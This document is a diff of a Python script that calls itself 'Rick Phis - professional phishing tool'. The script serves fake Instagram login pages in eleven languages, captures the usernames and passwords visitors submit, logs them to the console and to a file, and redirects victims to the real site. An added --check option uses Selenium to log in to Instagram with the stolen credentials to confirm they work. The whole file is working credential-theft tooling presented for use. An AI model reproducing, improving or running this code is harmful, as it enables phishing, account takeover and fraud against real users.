@@ -1,15 +1,14 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from colorama import Fore, init
 import argparse
-import requests
-import socket
-import time
-from datetime import datetime
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from urllib.parse import unquote
+import socket
+import time
+from datetime import datetime
 
 init()
 
@@ -56,6 +55,20 @@ language_mapping = {
     'tr': "htmls\\tr.html"
 }
 
+error_pages = {
+    'ar': "errors_htmls\\errorar.html",
+    'az': "errors_htmls\\erroraz.html",
+    'ch': "errors_htmls\\errorch.html",
+    'en': "errors_htmls\\errordef.html",
+    'fr': "errors_htmls\\errorfr.html",
+    'de': "errors_htmls\\errorde.html",
+    'it': "errors_htmls\\errorit.html",
+    'ko': "errors_htmls\\errorko.html",
+    'ru': "errors_htmls\\errorru.html",
+    'es': "errors_htmls\\errores.html",
+    'tr': "errors_htmls\\errortr.html"
+}
+
 help_menu = f"""{Fore.YELLOW}
 Rick Phis - professional phishing tool
 
@@ -64,18 +77,16 @@ Arguments:
   --lang  <language_code>   Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)
   --port  <port_number>     Port number (0-65535)
   --output <file_name>      Gets information as output
-  --getip                   Get public IP address (default: False)
   --location <url>          Redirect location (default: https://instagram.com)
-  -v, --verbose             Print verbose output to console
   --help                    Show this help message and exit
 """
 
-login_cehck = False
+login_check = False
 
 def check_turst(username, password):
-    global login_cehck
+    global login_check
     driver = webdriver.Chrome()
-    driver.implicitly_wait(1)
+    driver.implicitly_wait(0)
     driver.get("https://www.instagram.com/accounts/login/")
 
     WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.NAME, "username")))
@@ -92,12 +103,11 @@ def check_turst(username, password):
 
     error_message = driver.find_elements(By.XPATH, "//div[@class='_ab2z']")
     if error_message:
+        login_check = False
         print(Fore.RED + "Login failed! The username or password is incorrect." + Fore.RESET)
-        driver.quit()
-        login_cehck = False
     else:
         print(Fore.GREEN + "Login successful!" + Fore.RESET)
-        login_cehck = True
+        login_check = True
 
     driver.quit()
 
@@ -140,9 +150,8 @@ def main():
     parser.add_argument('--lang','-l', type=str, default='en', help='Language code (e.g., en, tr, de)')
     parser.add_argument('--port','-p', type=int, default=0, help='Port number (0-65535)')
     parser.add_argument('--output','-o', type=str, help='Gets information as output')
-    parser.add_argument('--getip', action='store_true', help='Get public IP address')
     parser.add_argument('--location', type=str, default='https://instagram.com', help='Redirect location (default: https://instagram.com)')
-    parser.add_argument('-v', '--verbose', action='store_true', help='Print verbose output to console')
+    parser.add_argument('--check', '-c', action='store_true', help='Perform login check')
 
     try:
         while True:
@@ -153,11 +162,11 @@ def main():
             try:
                 args = parser.parse_args(user_input)
             except argparse.ArgumentError as e:
-                print(Fore.RED + "invalid arguments, please get help with --help/-h command!" + Fore.RESET)
+                print(Fore.RED + "Invalid arguments, please get help with --help/-h command!" + Fore.RESET)
                 print(Fore.RESET)
                 continue
             except SystemExit:
-                print(Fore.RED + "invalid arguments, please get help with --help/-h command!" + Fore.RESET)
+                print(Fore.RED + "Invalid arguments, please get help with --help/-h command!" + Fore.RESET)
                 print(Fore.RESET)
                 continue
 
@@ -168,31 +177,31 @@ def main():
             chosen = args.site
             lang = args.lang
             port = args.port
-            getip = args.getip
             output_file = args.output
             redirect_location = args.location
-            verbose = args.verbose
+            check_trust = args.check
 
             web_site = language_mapping.get(lang.lower())
             if not web_site:
                 print(Fore.RED + "Invalid language code!")
                 continue
-            print(web_site)
+
             if chosen == 1:
-                start_server(web_site, port, getip, output_file, verbose, redirect_location)
+                start_server(web_site, port, output_file, redirect_location,check_trust)
             else:
                 print(f"Site {chosen} is under development. Coming soon!")
 
     except KeyboardInterrupt:
         print(Fore.YELLOW, "\nRick Phis was stopped (ctrl+c)", Fore.RESET)
 
-def start_server(web_site, port, getip, output_file, verbose, redirect_location):
+
+def start_server(web_site, port, output_file, redirect_location, check_trust):
     class MyHTTPRequestHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             file_path = self.path.strip('/')
             if file_path == '':
                 file_path = web_site
-
+            
             try:
                 if file_path.endswith('.css'):
                     with open(file_path, 'rb') as file:
@@ -212,31 +221,10 @@ def start_server(web_site, port, getip, output_file, verbose, redirect_location)
                 self.send_error(404, f'File Not Found: {self.path}')
             except Exception as e:
                 self.send_error(500, f'Server Error: {e}')
-
+        
         def do_POST(self):
-            global sel_password, sel_usernmae
-            if web_site == "htmls\\ar.html":
-                    error_web = "errors_htmls\\errorar.html"
-            elif web_site == "htmls\\az.html":
-                    error_web = "errors_htmls\\erroraz.html"
-            elif web_site == "htmls\\cj.html":
-                    error_web = "errors_htmls\\errorch.html"
-            elif web_site == "htmls\\de.html":
-                    error_web = "errors_htmls\\errorde.html"
-            elif web_site == "htmls\\es.html":
-                    error_web = "errors_htmls\\errores.html"
-            elif web_site == "htmls\\fr.html":
-                    error_web = "errors_htmls\\errorfr.html"
-            elif web_site == "htmls\\index.html":
-                    error_web = "errors_htmls\\errordef.html"
-            elif web_site == "htmls\\it.html":
-                    error_web = "errors_htmls\\errorit.html"
-            elif web_site == "htmls\\ko.html":
-                    error_web = "errors_htmls\\errorko.html"
-            elif web_site == "htmls\\ru.html":
-                    error_web = "errors_htmls\\errorru.html"
-            elif web_site == "htmls\\tr.html":
-                    error_web = "errors_htmls\\errortr.html"
+            global login_check
+            error_web = error_pages.get(web_site.split('\\')[-1].split('.')[0], "errors_htmls\\errordef.html")
             try:
                 content_length = int(self.headers['Content-Length'])
                 post_data = self.rfile.read(content_length).decode('utf-8')
@@ -245,53 +233,35 @@ def start_server(web_site, port, getip, output_file, verbose, redirect_location)
                 for item in post_data:
                     key, value = item.split('=')
                     data_dict[key] = value
-
-                public_ip = self.get_public_ip() if getip else 'N/A'
-                sel_usernmae = unquote(data_dict['username'])
-                sel_password = unquote(data_dict['password'])
-
-                check_turst(sel_usernmae, sel_password)
-
-
+                
+                sel_username = unquote(data_dict.get('username', ''))
+                sel_password = unquote(data_dict.get('password', ''))
+                
+                print(f"{Fore.BLUE}[{formatted_date}] {Fore.RED}Username: {sel_username}")
+                print(f"{Fore.BLUE}[{formatted_date}] {Fore.RED}Password: {sel_password}{Fore.RESET}")
+                
                 log_message = ""
-                if verbose and output_file:
-                    log_message = f"[{formatted_date}] Username: {sel_usernmae}\n" \
-                                  f"[{formatted_date}] Password: {sel_password}\n" \
-                                  f"[{formatted_date}] Address:  {public_ip}\n\n"
-
                 if output_file:
+                    log_message = f"[{formatted_date}] Username: {sel_username}\n" \
+                                  f"[{formatted_date}] Password: {sel_password}\n"
                     with open(output_file, 'a') as file:
                         file.write(log_message)
-
-                if verbose:
-                    print(f"{Fore.BLUE}[{formatted_date}]", Fore.RED, "Username:", {sel_usernmae})
-                    print(f"{Fore.BLUE}[{formatted_date}]", Fore.RED, "Password:", {sel_password})
-                    print(f"{Fore.BLUE}[{formatted_date}]", Fore.RED, "Address:",  public_ip, Fore.RESET)
-
-                if login_cehck:
+                
+                if check_trust:
+                    check_turst(sel_username, sel_password)
+                
+                if login_check or not check_trust:
                     self.send_response(302)
                     self.send_header('Location', redirect_location)
                     self.end_headers()
-                else:
+                elif login_check == False and check_trust:
                     self.send_response(302)
                     self.send_header('Location', f"http://{host}:{c_port}/{error_web}")
                     self.end_headers()
-
-                if not verbose:
-                    print(Fore.RED,"Username:", sel_usernmae)
-                    print(Fore.RED,"Password:", sel_password)
-                    print(Fore.RED,"Address:", public_ip, Fore.RESET)
-                    
+            
             except Exception as e:
                 self.send_error(500, f'Failed to process POST request: {e}')
 
-        def get_public_ip(self):
-            try:
-                response = requests.get('https://ipleak.net/json/')
-                return response.json()['ip']
-            except Exception as e:
-                print("Failed to obtain public IP address:", e)
-                return None
 
     host = get_ip_address()
     if port:
@@ -306,8 +276,6 @@ def start_server(web_site, port, getip, output_file, verbose, redirect_location)
         try:
             server = HTTPServer((host, c_port), MyHTTPRequestHandler)
             print(f"{Fore.GREEN}\nServer is started on: http://{host}:{c_port}/\n", Fore.RESET)
-            if verbose:
-                print(Fore.YELLOW,"Verbose mode is enabled. All output will be logged with timestamps\n",Fore.RESET)
             server.serve_forever()
         except Exception as e:
             print(Fore.RED, f"Failed to start server: {e}")
@@ -316,3 +284,4 @@ def start_server(web_site, port, getip, output_file, verbose, redirect_location)
 
 if __name__ == "__main__":
     main()
+
